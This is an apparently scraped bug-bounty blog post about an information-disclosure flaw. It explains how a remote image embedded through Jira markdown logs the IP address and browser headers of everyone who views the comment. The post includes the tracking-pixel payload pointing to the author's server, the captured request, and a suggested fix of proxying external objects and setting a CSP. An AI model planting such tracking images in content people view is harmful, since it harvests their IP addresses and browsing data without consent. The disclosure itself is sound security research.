---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-04-24_a-picture-that-steals-data.md
original_filename: 2019-04-24_a-picture-that-steals-data.md
title: A picture that steals data
category: documents
detected_topics:
- xss
- command-injection
- information-disclosure
- supply-chain
tags:
- imported
- documents
- xss
- command-injection
- information-disclosure
- supply-chain
language: en
raw_sha256: aef7c13201c3ff4ff353dbaafc5e3fc50505a6693f173f9d33cf063495338569
text_sha256: bb064a1b690841a0a91ca3f684b696f0091fa88fa2e1f078c2cb4d1c21fa3efa
ingested_at: '2026-06-28T07:31:59Z'
sensitivity: unknown
redactions_applied: false
---

# A picture that steals data

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-04-24_a-picture-that-steals-data.md
- Source Type: markdown
- Detected Topics: xss, command-injection, information-disclosure, supply-chain
- Ingested At: 2026-06-28T07:31:59Z
- Redactions Applied: False
- Raw SHA256: `aef7c13201c3ff4ff353dbaafc5e3fc50505a6693f173f9d33cf063495338569`
- Text SHA256: `bb064a1b690841a0a91ca3f684b696f0091fa88fa2e1f078c2cb4d1c21fa3efa`


## Content

---
title: "A picture that steals data"
page_title: "[BugBounty Tip] A good way to make money on one mistake. A picture that steals data. | by Sergey Kashatov | Medium"
url: "https://medium.com/@iframe_h1/a-picture-that-steals-data-ff604ba1012"
authors: ["Sergey Kashatov (@iframe0x01)"]
bugs: ["Information disclosure"]
publication_date: "2019-04-24"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5291
scraped_via: "browseros"
---

# A picture that steals data

Sergey Kashatov
Follow
3 min read
·
Apr 24, 2019

831

11

Hello, my name is Sergey, and I do security research and hunt for bugs.
Now I want to tell you about one vulnerability, about which few people know, and for which you can earn good money.

I call it like this, "Pixel that steals your data." (It sounds very funny)

With this vulnerability, I was able to earn good money, I will show you my reports with this error.
Press enter or click to view image in full size
1
Press enter or click to view image in full size
2
3
4
So what is the vulnerability?
1. The fact is that each site has some forms for data exchange? for example comments, biographies, messages.
For example, take Jira

I inserted a picture using markdown “ !test.jpg|thumbnail!”

Press enter or click to view image in full size

Let’s try uploading an image from another resource (Jira itself does not offer this feature.)

Now I will generate a trap of IP addresses on my site.

!https://site.one/hl/1556067225_d83d0cccc5e87cbe5c!

Press enter or click to view image in full size
Instantly on my server came the entrance.
GET from 46.158.xxx.xxx

Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Accept-Encoding: gzip, deflate, br
Referer: https://jira.site.ru/projects/PART/issues/PART-97?fi..
Accept: image/webp,image/apng,image/*,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
Connection: keep-alive
Host: site.one
Content-Length: 
Content-Type:

Now, if we send this comment with a loaded picture from my site, everyone who sees this will give me their data

To create such a picture, you can use this service.

https://iplogger.org/

The fact is that many developers do not think about such trifles.
You can fix this in different ways, but in my opinion, it would be better if you proxy all objects from third-party resources and create a CSP.
This error will be accepted by programs only if you can easily steal data from the user, for example, if you find such an error in chat messages (where people communicate), you will be able to steal the IP addresses of your interlocutors in large quantities. Then it will be accepted.
Attention! Each site has its own markup, I used a special payload for Attlassian Jira!

HackerOne: https://hackerone.com/iframe

Get Sergey Kashatov’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Twitter: https://twitter.com/iframe0x01 Have a good hunting)
